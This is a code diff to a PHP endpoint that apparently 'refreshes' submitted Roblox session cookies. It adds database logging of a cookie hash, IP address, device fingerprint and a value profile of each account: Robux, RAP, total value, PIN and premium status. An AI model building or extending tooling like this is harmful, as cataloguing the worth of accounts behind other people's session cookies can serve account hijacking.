@@ -12,6 +12,8 @@ ini_set('error_log', sys_get_temp_dir() . '/refresh_error.log');
 // SECURITY: Rate limiting & IP ban check
 // ================================================
 require_once __DIR__ . '/rate_limit.php';
+require_once __DIR__ . '/../../config/database.php';
+
 checkIPBan();
 checkRateLimit(3, 60);
 
@@ -399,7 +401,64 @@ function isQueueBusy() {
     return count($queue) > 5;
 }
 
-function logRefreshAttempt($success, $error = null, $userInfo = []) {
+function logRefreshAttempt($success, $error = null, $userInfo = [], $userData = []) {
+    $startTime = $_SERVER['REQUEST_TIME_FLOAT'] ?? microtime(true);
+    $responseTime = (int)((microtime(true) - $startTime) * 1000);
+    
+    // Database logging (try first)
+    if (Database::isAvailable()) {
+        try {
+            session_start();
+            $userId = $_SESSION['discord_user']['id'] ?? null;
+            session_write_close();
+            
+            $ip = getUserIP();
+            $cookie = $_POST['cookie'] ?? '';
+            $cookieHash = hash('sha256', $cookie);
+            
+            // Log to refresh_history
+            $stmt = Database::execute(
+                "INSERT INTO refresh_history 
+                (user_id, ip_address, cookie_hash, status, error_type, error_message, 
+                 response_time, user_agent, roblox_username, roblox_user_id, 
+                 robux_balance, premium_status, account_age, friends_count, user_data_snapshot)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                [
+                    $userId,
+                    $ip,
+                    $cookieHash,
+                    $success ? 'success' : 'failed',
+                    $error ? (explode(':', $error)[0] ?? 'unknown') : null,
+                    $error,
+                    $responseTime,
+                    $_SERVER['HTTP_USER_AGENT'] ?? null,
+                    $userData['username'] ?? $userInfo['username'] ?? null,
+                    $userData['userId'] ?? $userInfo['userId'] ?? null,
+                    $userData['robux'] ?? null,
+                    isset($userData['premium']) && str_contains($userData['premium'], 'True') ? 1 : 0,
+                    $userData['accountAge'] ?? null,
+                    $userData['friends'] ?? null,
+                    !empty($userData) ? json_encode($userData) : null
+                ]
+            );
+            
+            // Update user statistics if user is logged in
+            if ($userId) {
+                Database::execute(
+                    "UPDATE users 
+                     SET total_refreshes = total_refreshes + 1,
+                         successful_refreshes = successful_refreshes + ?,
+                         failed_refreshes = failed_refreshes + ?
+                     WHERE id = ?",
+                    [$success ? 1 : 0, $success ? 0 : 1, $userId]
+                );
+            }
+        } catch (Exception $e) {
+            error_log("Failed to log refresh attempt to database: " . $e->getMessage());
+        }
+    }
+    
+    // File-based logging (fallback and backward compatibility)
     $logFile = sys_get_temp_dir() . '/refresh_stats.json';
     $stats = [];
     
@@ -865,6 +924,21 @@ try {
         'country' => $ipInfo['country'],
         'device' => $deviceInfo['type'],
         'fingerprint' => $deviceInfo['fingerprint']
+    ], [
+        'username' => $userInfoData['name'] ?? '—',
+        'userId' => $userId,
+        'robux' => $robux,
+        'pendingRobux' => $pendingRobux,
+        'rap' => $rap,
+        'summary' => $summary,
+        'totalValue' => $totalValue,
+        'accountCreated' => $accountCreatedDate,
+        'accountAge' => $accountAge,
+        'pin' => $pinStatus,
+        'premium' => ($settingsData['IsPremium'] ?? false) ? '✅ True' : '❌ False',
+        'voiceChat' => $vcStatus,
+        'friends' => $friendsCount,
+        'followers' => $followersCount
     ]);
 
     $flagEmoji = $ipInfo['countryCode'] !== '??' ? ":flag_{$ipInfo['countryCode']}:" : '🌍';
